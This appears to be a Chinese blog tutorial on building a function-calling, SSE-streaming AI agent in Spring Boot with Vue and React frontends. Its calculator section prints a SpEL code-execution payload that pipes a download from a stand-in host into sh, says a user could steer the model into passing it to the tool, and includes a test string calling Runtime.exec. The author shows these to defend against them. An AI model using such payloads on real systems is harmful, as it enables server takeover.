# Spring Boot 3 + Spring Cloud Gateway + Vue3 实战:从零手写一个支持 Function Calling 与 SSE 流式输出的 AI Agent(附完整源码)

> 系列第 1 篇。不用 Spring AI,不用 LangChain4j,用 600 行 Java 把 Agent 的每一个字节都写清楚。
> 完整代码:https://github.com/zhoubiao188/ai-agent-lab

## 写在前面:为什么我要手写一遍

过去半年我把团队里三个"AI 功能"从 Demo 推到线上,踩的坑几乎都不在"调模型"这件事上。`chat/completions` 谁都会调,真正让人半夜爬起来的是这些:

- 模型在同一步里先吐了一句"好的,我来帮你查一下天气",然后才发起工具调用。这句过渡语已经流到前端了,**最终答案出来时用户看到的是两段重复的话**;
- 工具调用的 `arguments` 不是一次性给你的,它是**分多帧的碎片**。第一帧只有 `{"city":"北`,第三帧才是 `"京"}`。不少自研实现直接在第一帧就 `JSON.parse`,然后线上随机 30% 的工具调用报"参数解析失败";
- 会话记忆做了裁剪,某天开始所有请求都 400。日志里写着 `messages with role 'tool' must be a response to a preceding message with 'tool_calls'` —— 因为裁剪时把 `assistant(tool_calls)` 删了,却留下了 `tool` 结果;
- 一个第三方天气接口挂了,整个对话超时 60 秒,用户以为服务死了。

这些问题的共同点是:**框架把它们封装得太好了,好到你不知道它替你做了什么,出问题时也就不知道该改哪里。**

所以这个系列的做法是:先手写一遍,把每条协议、每个边界都摊开;写完之后你再去看 Spring AI 的源码,会发现你是在"读代码"而不是"猜魔法"。

## 成品长什么样

一句话:**一个能自己决定"要不要调工具、调哪个、调几次"的对话服务**,流式输出,前端能实时看到每次工具调用的参数和返回。

具体能力:

| 能力 | 实现方式 |
| --- | --- |
| 流式输出 | SSE(POST + `text/event-stream`),逐字下发 |
| 工具调用 | 标准 OpenAI `tools` 协议,支持同一步并行调多个工具 |
| 多轮编排 | 后端 while 循环,拿到工具结果回填后继续下一轮 |
| 双 provider | `mock`(零 Key 可跑)/ `openai`(兼容 DeepSeek、通义、Moonshot、vLLM、Ollama) |
| 会话记忆 | 滑动窗口,保证 tool 消息成对 |
| 限流 | 令牌桶,按 clientId / IP |
| 可观测 | Micrometer 指标 + `X-Request-Id` 全链路追踪 |

一次真实请求的事件流长这个样子(这是我本地 `curl -N` 的真实输出,已折叠):

```
event:message_start   data:{"conversationId":"demo-1","provider":"mock","realModel":false}
event:tool_start      data:{"index":0,"id":"call_mock_1","name":"get_weather"}
event:tool_start      data:{"index":1,"id":"call_mock_2","name":"calculator"}
event:tool_result     data:{"id":"call_mock_1","name":"get_weather","success":true,
                            "content":"北京 当前天气:晴,气温 18~27℃…","elapsedMs":3}
event:tool_result     data:{"id":"call_mock_2","name":"calculator","success":true,
                            "content":"表达式 (128.5+71.5)*3/2 = 300","elapsedMs":0}
event:delta           data:{"text":"查询结果如下:\n"}
event:delta           data:{"text":"- **get_weather**: 北京 当前天气:晴…"}
...
event:done            data:{"steps":2,"promptTokens":120,"completionTokens":80,"elapsedMs":1830}
```

注意两个 `tool_start` 是**并行**的:用户问"北京天气怎么样,顺便算一下 (128.5+71.5)*3/2",模型一次就发起了两个工具调用。

## 整体架构

```
┌─────────────────────────┐        ┌──────────────────────────────────────────┐
│  Vue 3 (5173)           │        │  agent-service (8081)                    │
│  React 18 (5174)        │        │                                          │
│  fetch + ReadableStream │        │  ChatController ──SseEmitter──┐          │
└───────────┬─────────────┘        │                               │          │
            │  POST /api/chat/stream (SSE)                         ▼          │
┌───────────▼─────────────┐        │      AgentOrchestrator (while 循环)       │
│ Spring Cloud Gateway    │ ──────▶│        ├─ buildMessages(记忆 + system)    │
│ (8080)                  │        │        ├─ LlmProvider.stream(...)        │
│  · 路由 / 跨域           │        │        │    ├─ 文本增量 → SSE delta      │
│  · X-Request-Id 追踪     │        │        │    └─ tool_calls 增量 → 聚合     │
│  · SSE 关闭缓冲          │        │        ├─ ToolRegistry ──▶ AgentTool     │
└─────────────────────────┘        │        └─ 结果回填 → 下一轮               │
                                   │                                          │
                                   │  LlmProvider: mock │ openai(兼容协议)     │
                                   └──────────────────────────────────────────┘
```

模块划分刻意做得很少,因为**每多一层抽象,你就多一个找不到 bug 的地方**:

```
day01-agent-core/
├── agent-service/     # Spring Boot 3 核心服务
├── gateway/           # Spring Cloud Gateway
├── web-vue/           # Vue 3 + TS + Vite
└── web-react/         # React 18 + TS + Vite
```

下面按"数据从用户输入到答案返回"的顺序拆。

## 一、LLM 抽象层:一套代码兼容所有 OpenAI 协议

### 1.1 先定义内部消息模型

不要把厂商的 DTO 直接当成业务模型用,否则换模型时你会想删库。内部模型只保留 Agent 编排真正需要的字段:

```java
@JsonInclude(JsonInclude.Include.NON_NULL)
public record Msg(
        String role,          // system / user / assistant / tool
        String content,
        String toolCallId,    // tool 消息必须回带上一次的调用 id
        String name,          // tool 消息对应的工具名
        List<ToolCall> toolCalls
) {
    public static Msg system(String c)               { return new Msg("system", c, null, null, null); }
    public static Msg user(String c)                 { return new Msg("user", c, null, null, null); }
    public static Msg assistant(String c, List<ToolCall> tc) { return new Msg("assistant", c, null, null, tc); }
    public static Msg tool(String id, String n, String c)    { return new Msg("tool", c, id, n, null); }

    public boolean hasToolCalls() {
        return toolCalls != null && !toolCalls.isEmpty();
    }
}
```

`record` + 静态工厂的好处是:构造一条消息时,你**不可能**忘记传 `toolCallId` —— 因为 `Msg.tool()` 的签名强制你传。

### 1.2 流式协议解析:三个必须处理的坑

`LlmProvider` 只暴露一个方法,而且必须是流式的:

```java
public interface LlmProvider {
    String name();
    void stream(LlmRequest request, StreamListener listener);

    interface StreamListener {
        void onContentDelta(String delta);
        void onToolCallDelta(int index, String id, String name, String argumentsFragment);
        void onFinish(String finishReason, TokenUsage usage);
        void onError(Throwable error);
    }
}
```

用 JDK 自带的 `HttpClient`(不引 WebClient,少一层 Reactor 心智负担)读 SSE:

```java
try (BufferedReader reader = new BufferedReader(new InputStreamReader(in, StandardCharsets.UTF_8))) {
    String line;
    while ((line = reader.readLine()) != null) {
        if (line.isEmpty() || line.startsWith(":")) continue;   // 注释帧/心跳
        if (!line.startsWith("data:")) continue;                // event: / id: 忽略
        String data = line.substring(5).trim();
        if (data.isEmpty()) continue;
        if ("[DONE]".equals(data)) break;                       // 坑 3:之后不要再读
        JsonNode chunk = mapper.readTree(data);
        ...
    }
}
```

**坑 1:SSE 不是一个 JSON 一行。** 它是"若干 `field: value` 行 + 一个空行"为一帧。按行读、只认 `data:` 前缀,是最稳的写法;用 `split("\n\n")` 自己切帧在跨 TCP 包时容易切坏(前端必须自己做 buffer 拼接,这一点在第 6 节会再遇到一次)。

**坑 2:`tool_calls` 是增量的。** 同一个调用的 `name` 只在第一帧出现,`arguments` 是逐段拼的,`index` 用来区分同时发起的多个调用:

```java
JsonNode toolCalls = delta.get("tool_calls");
if (toolCalls != null && toolCalls.isArray()) {
    for (JsonNode tc : toolCalls) {
        int index = tc.path("index").asInt(0);
        String id = tc.path("id").isMissingNode() ? null : tc.path("id").asText(null);
        JsonNode fn = tc.get("function");
        String name = fn == null ? null : fn.path("name").asText(null);
        String args = fn == null ? null : fn.path("arguments").asText(null);
        listener.onToolCallDelta(index, id, name, args);   // 交给上层按 index 聚合
    }
}
```

**坑 3:`usage` 默认不给你。** 流式模式下必须显式请求,否则你永远算不出成本:

```java
body.putObject("stream_options").put("include_usage", true);
```

### 1.3 为什么一定要有一个 mock provider

很多人觉得写 mock 是浪费时间。我的看法相反,`MockLlmProvider` 是这个项目里性价比最高的一个类:

1. **别人 clone 下来不用注册账号就能跑通全链路**。一个"需要你先去申请 API Key"的仓库,90% 的人看到这里就关了;
2. **单元测试必须有确定性 provider**。你要测"两个工具并行"“工具超时""达到 maxSteps 兜底",用真实模型根本没法稳定复现;
3. **它顺便验证了增量聚合**。我故意把工具参数 JSON 拆成三段下发:

```java
int mid1 = args.length() / 3, mid2 = args.length() * 2 / 3;
listener.onToolCallDelta(i, "call_mock_" + (i + 1), p.tool(), null);   // 第一帧带 name
listener.onToolCallDelta(i, null, null, args.substring(0, mid1));
listener.onToolCallDelta(i, null, null, args.substring(mid1, mid2));
listener.onToolCallDelta(i, null, null, args.substring(mid2));
```

如果你的聚合逻辑写错了,离线跑一次就会露馅,而不用等到线上。

## 二、工具层:让模型"能动手"

### 2.1 工具就是一个接口

```java
public interface AgentTool {
    String name();                         // [a-zA-Z0-9_-]{1,64}
    String description();                  // 决定模型会不会正确调用它
    JsonNode parameterSchema();            // JSON Schema
    default boolean mutating() { return false; }   // 是否有副作用
    ToolResult execute(JsonNode args, ToolContext ctx);
}
```

`description` 是整个工具层里**最值得反复打磨**的字段。它不是给人看的注释,而是模型唯一的决策依据。对比这两版:

```java
// 差:模型不知道什么时候该用,经常在闲聊里也调一次
return "查询天气";

// 好:说清触发条件、参数形态、边界
return "查询指定城市当前天气与温度。当用户询问天气、气温、是否下雨、"
     + "出门是否带伞等问题时必须调用。";
```

注册表负责启动时收集所有 `AgentTool`,并做重名保护:

```java
public ToolRegistry(List<AgentTool> discovered) {
    Map<String, AgentTool> map = new LinkedHashMap<>();
    discovered.stream().sorted(Comparator.comparing(AgentTool::name)).forEach(t -> {
        if (map.putIfAbsent(t.name(), t) != null) {
            throw new IllegalStateException("工具名重复: " + t.name());   // 启动即失败,好过线上覆盖
        }
    });
    this.tools = Map.copyOf(map);
    log.info("已注册 {} 个 Agent 工具: {}", tools.size(), tools.keySet());
}
```

新增工具只需要 `implements AgentTool` + `@Component`,**不需要改任何一行编排代码**。

### 2.2 五个真实工具

| 工具 | 教学价值 |
| --- | --- |
| `get_current_time` | 最便宜的例子:模型知识里没有"现在",不调工具必然瞎编 |
| `get_weather` | 演示上游故障时怎么把错误如实回传给模型 |
| `calculator` | **反面教材**:为什么不能用 SpEL/ScriptEngine |
| `search_knowledge_base` | 轻量 BM25,企业 FAQ 场景够用 |
| `create_support_ticket` | 写操作:幂等 + 副作用标记 |

### 2.3 计算器工具:一次差点上生产事故的实现

需求很简单:让模型算数。最直觉的写法是 SpEL:

```java
// 千万不要这样写
ExpressionParser parser = new SpelExpressionParser();
BigDecimal r = new BigDecimal(parser.parseExpression(userInput).getValue().toString());
```

`userInput` 从哪来?**从模型来**。而模型的输出,最终源头是用户输入。也就是说你等于把一个 RCE 后门接在了公网对话接口上。

`T(java.lang.Runtime).getRuntime().exec('curl evil.sh|sh')` 这种 payload,只要用户能诱导模型把它放进 `expression` 字段,你的服务器就没了。

正确做法是只认四则运算,自己写个 60 行的递归下降解析器 —— 它**永远只做算术**:

```java
/** expression := term (('+'|'-') term)* */
BigDecimal parseExpression() {
    BigDecimal value = parseTerm();
    while (true) {
        skipSpaces();
        if (consume('+'))      value = value.add(parseTerm(), MC);
        else if (consume('-')) value = value.subtract(parseTerm(), MC);
        else return value;
    }
}

/** term := factor (('*'|'/'|'%') factor)* */
private BigDecimal parseTerm() {
    BigDecimal value = parseFactor();
    while (true) {
        skipSpaces();
        if (consume('*')) {
            value = value.multiply(parseFactor(), MC);
        } else if (consume('/')) {
            BigDecimal d = parseFactor();
            if (d.signum() == 0) throw new ArithmeticException("除数不能为 0");
            value = value.divide(d, MC);
        } else if (consume('%')) {
            BigDecimal d = parseFactor();
            if (d.signum() == 0) throw new ArithmeticException("取模的除数不能为 0");
            value = value.remainder(d, MC);
        } else return value;
    }
}
```

配套的安全用例(这条测试比功能测试重要得多):

```java
@Test
void rejectsArbitraryCode() throws Exception {
    String out = eval("T(java.lang.Runtime).getRuntime().exec('id')");
    assertTrue(out.startsWith("ERROR:"));
    assertFalse(out.contains("uid="));
}
```

顺便说一句:用 `BigDecimal` 而不是 `double`,是因为 0.1+0.2 在模型嘴里是 0.30000000000000004 —— 用户会截图发到群里笑你。

### 2.4 写操作工具必须有幂等

模型没有幂等意识。用户说"我要投诉",模型可能在同一步调两次 `create_support_ticket`,也可能用户手抖发了两遍。所以写操作要自己做幂等键:

```java
String key = ctx.conversationId() + ":" + Integer.toHexString(summary.hashCode());
String existing = created.get(key);
if (existing != null) {
    return ToolResult.ok("该诉求已创建过工单,工单号 %s(幂等命中,未重复创建)。".formatted(existing), 0);
}
```

并且用 `mutating()` 标记它,这样在"沙箱/演示模式"下可以一键禁用所有副作用工具 —— 这是给产品同事演示时最有用的开关。

## 三、Agent 循环:整个项目就这 40 行

### 3.1 伪代码先摆出来

```
messages = [system] + memory(history) + [user]
for step in 1..maxSteps:
    (content, toolCalls) = llm.stream(messages)      # 流式,边收边推给前端
    if toolCalls is empty:
        return content                               # 结束
    messages += assistant(content, toolCalls)
    for call in toolCalls:
        result = execute(call)                       # 带超时
        messages += tool(call.id, result)
# 跑满了还没结束 → 兜底话术,别让模型无限烧 token
```

### 3.2 真实实现里的三个细节

**(1) 同一步里的内容要能撤回。** 模型经常"边说边做":

```
模型: 好的,我帮你查一下北京的天气……      ← 已经 delta 推给前端了
模型: [tool_calls: get_weather]           ← 然后突然发起调用
```

如果不处理,等最终答案出来时,用户看到的是"我帮你查一下……" + "查询结果如下……" 两段割裂的话。做法是:发现本轮有 tool_calls 且有内容时,推一个 `delta_reset` 事件让前端清空当前气泡:

```java
if (!outcome.content.isEmpty()) {
    sink.emit("delta_reset", Map.of("reason", "tool_call_started"));
}
memory.append(conversationId, Msg.assistant(
        outcome.content.isEmpty() ? null : outcome.content.toString(), outcome.toolCalls));
```

前端只需一行:

```ts
case 'delta_reset':
  target.text = ''
  break
```

这个细节在 Demo 里永远看不到,但在真实用户的对话里 20% 会出现。

**(2) 按 index 聚合工具调用。** 增量回调收到的碎片要攒起来:

```java
@Override
public void onToolCallDelta(int index, String id, String name, String argsFragment) {
    ToolCallAcc acc = outcome.accs.computeIfAbsent(index, ToolCallAcc::new);
    if (id != null && !id.isEmpty()) acc.id = id;
    if (name != null && !name.isEmpty()) {
        if (acc.name == null) {                       // name 只在第一帧出现
            acc.name = name;
            sink.emit("tool_start", Map.of("index", index, "name", name));
        }
    }
    if (argsFragment != null && !argsFragment.isEmpty()) acc.args.append(argsFragment);
}
```

聚合完再做一次兜底:模型偶尔会吐坏 JSON,不要让它把整条线程炸掉:

```java
private JsonNode readArgs(String raw) {
    if (raw == null || raw.isBlank()) return mapper.createObjectNode();
    try {
        JsonNode node = mapper.readTree(raw);
        return node.isObject() ? node : mapper.createObjectNode();
    } catch (Exception e) {
        log.warn("工具参数不是合法 JSON: {}", raw);
        return mapper.createObjectNode();        // 交给工具自己按"参数缺失"处理
    }
}
```

**(3) 工具必须有自己的超时。** 一个卡死的三方接口,会把整条对话拖到 SSE 超时:

```java
Future<ToolResult> future = toolExecutor.submit(() -> tool.execute(args, ctx));
try {
    result = future.get(15, TimeUnit.SECONDS);        // 工具超时 < 整体请求超时
} catch (TimeoutException e) {
    future.cancel(true);
    result = ToolResult.fail("工具「%s」执行超时(15s),已中断".formatted(call.name()), elapsed);
}
```

失败也要**如实告诉模型**,而不是抛异常中断:

```java
return "ERROR: 工具「get_weather」执行超时(15s),已中断";
```

好的模型看到 ERROR 会自己换策略(改参数重试、或者直接告诉用户"天气服务暂时不可用")。这就是"把错误当作一种正常的工具返回值"。

### 3.3 状态机的全貌

```
                    ┌──────────────┐
      用户输入 ─────▶│ buildMessages│
                    └──────┬───────┘
                           ▼
                    ┌──────────────┐   content 增量 ──▶ SSE delta
                    │ llm.stream() │───tool_calls 增量 ─▶ 按 index 聚合
                    └──────┬───────┘
                 ┌─────────┴─────────┐
        有 tool_calls            无 tool_calls
                 │                   │
                 ▼                   ▼
        ┌────────────────┐    ┌────────────┐
        │ delta_reset    │    │ message_end│──▶ 结束
        │ 执行工具(超时) │    └────────────┘
        │ 结果回填 memory │
        └────────┬───────┘
                 │ step < maxSteps
                 └──────▶ 回到 llm.stream()
                 │ step == maxSteps
                 └──────▶ 兜底话术 + message_end(finishReason=max_steps)
```

## 四、把它推到生产:五个"不写就会出事"的点

### 4.1 会话记忆:tool 消息必须成对

这是本文开头提到的 400 报错。滑动窗口裁剪时,如果你只按条数丢,可能丢掉 `assistant(tool_calls)` 却留着紧随其后的 `tool` 结果,下一次请求被模型侧直接拒掉:

```java
private void trim(Session s) {
    while (s.messages.size() > window) {
        Msg head = s.messages.removeFirst();
        // 丢掉带 tool_calls 的 assistant,必须连带丢掉它的 tool 结果
        if (head != null && head.hasToolCalls()) {
            while (!s.messages.isEmpty() && "tool".equals(s.messages.peekFirst().role())) {
                s.messages.removeFirst();
            }
        }
    }
    // 窗口首条不能是孤立的 tool 消息
    while (!s.messages.isEmpty() && "tool".equals(s.messages.peekFirst().role())) {
        s.messages.removeFirst();
    }
}
```

对应的测试(这类"数据合法性"测试比功能测试更有价值):

```java
@Test
void memoryNeverStartsWithOrphanToolMessage() {
    ConversationMemory small = new ConversationMemory(propsWithWindow(4));
    small.append("cx", Msg.user("a"));
    small.append("cx", Msg.assistant(null, List.of(
            new ToolCall("call1", "get_weather", "{\"city\":\"北京\"}"))));
    small.append("cx", Msg.tool("call1", "get_weather", "晴"));
    small.append("cx", Msg.assistant("答案是晴", null));
    small.append("cx", Msg.user("b"));

    assertFalse("tool".equals(small.history("cx").get(0).role()));
}
```

另外加个空闲过期(`evictIdle`),用 `@Scheduled` 每 10 分钟清一次,不然长跑进程的内存会缓慢上涨。

### 4.2 限流:LLM 调用是按 token 计费的

一个写错的 `useEffect` 就能把你的账单打穿。放在 Filter 里,而不是业务代码里,这样所有 `/api/chat/**` 自动生效:

```java
private boolean tryAcquire(String key) {
    long now = System.nanoTime();
    Bucket bucket = buckets.computeIfAbsent(key, k -> new Bucket(capacity, now));
    synchronized (bucket) {
        bucket.tokens = Math.min(capacity, bucket.tokens + (now - bucket.lastRefillNanos) * refillPerNano);
        bucket.lastRefillNanos = now;
        if (bucket.tokens >= 1.0) { bucket.tokens -= 1.0; return true; }
        return false;
    }
}
```

单机令牌桶,多实例换成 Redis + Lua 即可,拦截点不用动。

### 4.3 指标:只留四个真正能告警的

```java
agent_request_total            # 按 result=ok/error/max_steps/client_closed 分 tag
agent_llm_latency              # P50/P95/P99
agent_tool_invocations_total   # 按 tool + result 分 tag —— 某个工具成功率掉了立刻能看见
agent_active_streams           # 当前并发流,飙升说明有请求挂住了
```

`agent_tool_invocations_total{tool="get_weather",result="error"}` 这条线的价值:三方接口挂掉时,你不用等用户投诉,指标先报警。

### 4.4 别把 API Key 写进 yml

```yaml
agent:
  llm:
    api-key: ${AGENT_LLM_API_KEY:}      # 环境变量注入,yml 里只有占位符
```

`.gitignore` 里把 `.env*` 全排掉。这条我吃过亏:曾经有个 Key 进了一次 commit,虽然马上 force push 删了,但 GitHub 的公开事件流已经抓到了,当天就被刷了几百块。

### 4.5 SSE 的两个隐蔽配置

SSE 走的是"一条 HTTP 长连接",这意味着所有"短请求"时代的默认值都会咬你:

- **容器层**:Spring MVC 的 `spring.mvc.async.request-timeout` 必须 ≥ `SseEmitter` 的 timeout,否则异步请求会被容器提前掐断;
- **网关层**:`spring.cloud.gateway.httpclient.response-timeout` 必须比服务端的整体超时更长,否则后端还在生成,网关已经 504 了。

## 五、Spring Cloud Gateway:两个必须改的配置

网关在这里只做三件事:路由、跨域、追踪。但有两个坑必须踩过才知道。

### 5.1 响应超时要放大

```yaml
spring:
  cloud:
    gateway:
      httpclient:
        response-timeout: 300s     # 默认值对 SSE 来说太短
        connect-timeout: 5000
      routes:
        - id: agent-service
          uri: ${AGENT_SERVICE_URI:http://localhost:8081}
          predicates:
            - Path=/api/**
```

### 5.2 SSE 要主动关掉缓冲

Nginx、部分 CDN、甚至某些浏览器扩展都会缓存 `text/event-stream`。表现是:**前端一句话都不出,最后一次性全吐出来**。解法是显式加两个响应头:

```java
if (isEventStream(request)) {
    response.getHeaders().set(HttpHeaders.CACHE_CONTROL, "no-cache, no-transform");
    response.getHeaders().set("X-Accel-Buffering", "no");   // 给 Nginx 看的
}
```

顺便在同一个 `GlobalFilter` 里把 `X-Request-Id` 生成并透传下去 —— SSE 请求在网关日志里是一条"很久才结束"的记录,没有 requestId 根本没法跟后端日志对上:

```java
return chain.filter(exchange.mutate().request(mutated).build())
        .doFinally(signal -> log.info("{} {} -> {} ({}ms) rid={}",
                request.getMethod(), path, response.getStatusCode(),
                System.currentTimeMillis() - start, rid));
```

## 六、前端:为什么 EventSource 不能用

几乎所有"SSE 教程"都会让你 `new EventSource(url)`。在对话场景里这条路走不通:

1. **`EventSource` 只支持 GET**。对话要 POST 一个 JSON body(历史消息、参数、模型选择),塞不进 query;
2. **不能自定义 header**。带不上 token、带不上 `X-Client-Id`(限流要用);
3. **断线自动重连是灾难**。生成类请求重连 = 重新触发一次完整推理,用户付两次钱。

所以用 `fetch` + `ReadableStream` 自己解析。协议本身很简单,但有个坑:**一个 SSE 帧可能被 TCP 切成两半**。必须自己维护 buffer:

```ts
const reader = resp.body.getReader()
const decoder = new TextDecoder('utf-8')
let buffer = ''

while (true) {
  const { done, value } = await reader.read()
  if (done) break
  // stream: true 很关键:一个 UTF-8 汉字可能被切在两个 chunk 里
  buffer += decoder.decode(value, { stream: true })

  let idx: number
  while ((idx = buffer.indexOf('\n\n')) >= 0) {
    const raw = buffer.slice(0, idx)
    buffer = buffer.slice(idx + 2)
    const evt = parseFrame(raw)
    if (evt) onEvent(evt)
  }
}
```

`decoder.decode(value, { stream: true })` 里的 `stream: true` 是很多人漏掉的:`TextDecoder` 默认认为每个 chunk 都是完整的,遇到被切断的多字节字符会直接输出 `�`。

### 6.1 前端状态管理:只 patch 最后一条消息

事件是一条条到达的增量,所以状态更新必须走**函数式更新**,不能闭包捕获旧值:

```ts
const patchLast = (patch: (m: ChatMsg) => ChatMsg) => {
  setMessages(prev => {
    if (!prev.length) return prev
    const next = prev.slice()
    next[next.length - 1] = patch(next[next.length - 1])
    return next
  })
}
```

否则 `setMessages([...messages, ...])` 在快速连续事件下会互相覆盖 —— 表现就是"字被吞了"。

### 6.2 把工具调用做成可见的卡片

Agent 最让人不信任的地方是"黑箱":用户不知道它刚才干了什么。所以每次 `tool_start` 就渲染一张卡片,`tool_result` 到了再填参数和结果:

```
⏳ get_weather      →  ✅ get_weather    3 ms
                          {"city":"北京"}
                          北京 当前天气:晴,气温 18~27℃
```

这段 UI 的代码不多,但对"信任感"的提升比任何动画都大。

## 七、跑起来

```bash
# 后端(默认 mock 模式,不需要任何 Key)
mvn -q -DskipTests package
java -jar agent-service/target/agent-service-1.0.0.jar     # :8081
java -jar gateway/target/gateway-1.0.0.jar                # :8080

# 前端(任选)
cd web-vue   && npm i && npm run dev    # :5173
cd web-react && npm i && npm run dev    # :5174
```

命令行直接看流:

```bash
curl -N -X POST http://localhost:8080/api/chat/stream \
  -H 'Content-Type: application/json' \
  -d '{"message":"北京今天天气怎么样?顺便帮我算一下 (128.5+71.5)*3/2"}'
```

切成真实模型(DeepSeek 为例,任何 OpenAI 兼容网关都行):

```bash
export AGENT_LLM_API_KEY=sk-xxxx
java -jar agent-service/target/agent-service-1.0.0.jar \
  --agent.provider=openai \
  --agent.llm.base-url=https://api.deepseek.com/v1 \
  --agent.llm.model=deepseek-chat
```

业务代码一行不改。

## 八、踩坑清单

| 现象 | 根因 | 解法 |
| --- | --- | --- |
| 工具调用 30% 概率"参数解析失败" | 只取了第一帧的 arguments 碎片 | 按 `index` 聚合全部增量 |
| 最终答案前多一段重复的过渡语 | 模型"边说边做",前置文本已流出 | 推 `delta_reset` 让前端清空气泡 |
| 某天起所有请求 400 | 记忆裁剪丢了 `assistant(tool_calls)` 留了 `tool` | 裁剪时成对删除,并保证首条不是 tool |
| 前端一直不出字,最后一次性全吐 | 网关/Nginx 缓冲了 event-stream | `Cache-Control: no-cache` + `X-Accel-Buffering: no` |
| 网关 504,后端日志还在生成 | 网关 response-timeout 比服务端短 | 网关超时 > 服务端超时 |
| 偶发乱码 `�` | `TextDecoder` 没开 `stream: true` | 开;并维护 buffer 拼接帧 |
| 汉字输入法按 Enter 直接发送 | 没判断 `isComposing` | `e.nativeEvent.isComposing` |
| 一个三方接口挂了,整条对话超时 | 工具执行没有独立超时 | 独立线程池 + `Future.get(15s)` |
| 前端包 1MB | `import hljs from 'highlight.js'` 全量引入 | 改成 `highlight.js/lib/common`,1.06MB → 276KB |
| 账单突然暴涨 | 没有限流 + 没有 maxSteps | 令牌桶 + 步数上限 + 兜底话术 |

最后一条实测数据:`highlight.js` 全量引入时产物 1061 KB(gzip 356 KB),换成 `lib/common` 后 276 KB(gzip 96 KB),降了 74%。

## 九、这套代码的边界(以及下一篇要补的)

我不想把 Demo 吹成生产系统。目前明确的短板:

1. **记忆在进程内**,重启即丢,也撑不起 50 轮以上的长对话 → 第 2 篇换 Redis,并加"滚动摘要压缩";
2. **检索是词面 BM25**。中文 2-gram 在几十条 FAQ 上召回够用,但用户口语化之后会漏。第 3 篇接向量检索,并且**先做一个 50 条的评测集**,用数字说话而不是"感觉更准了";
3. **工具串行执行**。同一轮里无依赖的工具完全可以并发,把 P99 从 `sum(t)` 降到 `max(t)`;
4. **没有鉴权**。生产环境要接 Spring Security,按用户维度做配额和计费。

## 十、小结

如果只能记一句话:**Agent 不是"更聪明的 prompt",而是一个状态机 + 一套协议实现。**

- 状态机:什么时候调工具、调几次、什么时候必须停;
- 协议:增量怎么聚合、消息怎么才合法、错误怎么回传。

这两件事都跟模型强弱无关,但决定了你的功能能不能上线。先手写一遍,把这些边界都摸清楚,再去用框架 —— 那时你是在"选择工具",而不是"祈求魔法"。

**完整源码(可运行,含 Vue3 与 React 两套前端、15 个单元测试、CI 配置):**
https://github.com/zhoubiao188/ai-agent-lab

下一篇:`《给 Agent 装上长期记忆:Redis 会话存储 + 滚动摘要压缩,支撑 50 轮长对话》` —— 会给出压缩前后的 token 成本对比和"记忆污染"的实测案例。

如果这篇对你有帮助,点个赞让我知道;有想看的场景(多 Agent 协作?成本看板?)评论区告诉我,我按票数排后面的选题。
